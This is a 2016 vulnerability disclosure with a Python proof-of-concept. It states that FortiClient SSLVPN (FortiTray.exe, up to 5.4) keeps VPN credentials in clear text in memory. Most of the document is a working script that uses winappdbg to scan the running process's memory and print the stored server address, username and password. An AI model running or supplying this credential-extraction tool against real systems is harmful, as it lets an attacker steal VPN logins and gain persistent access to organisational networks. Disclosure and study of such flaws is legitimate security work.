'''
Title       : Extracting clear text passwords from running processes(FortiClient)
CVE-ID                  : none
Product                : FortiClient SSLVPN
Service                 : FortiTray.exe
Affected              : <=5.4
Impact                  : Critical
Remote                : No
Website link       : http://forticlient.com/
Reported             : 31/08/2016
Authors                : Viktor Minin                     https://1-33-7.com
                                  Alexander Korznikov    http://korznikov.com
-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
In our research which involved this program we found that this process store the credentials that you supplied for connecting, in clear text in the process memory.
In this situation a potential attacker who hacked your system can reveal your Username and Password steal and use them.
This may assist him in gaining persistence access to your Organization LAN network.
'''

from winappdbg import Debug, Process, HexDump
import sys

filename = "FortiTray.exe"                          # Process name
search_string = "fortissl"                              # pattern to get offset when the credentials stored

# Searching function
def memory_search( pid, strings ):
                process = Process( pid )
                mem_dump = []
                                                                ######
                                                                # You could also use process.search_regexp to use regular expressions,
                                                                # or process.search_text for Unicode strings,
                                                                # or process.search_hexa for raw bytes represented in hex.
                                                                ######
                for address in process.search_bytes( strings ):
                                dump = process.read(address-10,800)                             #Dump 810 bytes from process memory
                                mem_dump.append(dump)
                                for i in mem_dump:
                                                if "FortiClient SSLVPN offline" in i:                       #print all founds results by offsets to the screen.
                                                                print "\n"
                                                                print " [+] Address and port to connect: " + str(i[136:180])
                                                                print " [+] UserName: " + str(i[677:685])
                                                                print " [+] Password: " + str(i[705:715])
                                                                print "\n"

debug = Debug()
try:
                # Lookup the currently running processes.
                debug.system.scan_processes()
                # Look for all processes that match the requested filename...
                for ( process, name ) in debug.system.find_processes_by_filename( filename ):
                                pid = process.get_pid()
                                memory_search(pid,search_string)
finally:
                debug.stop()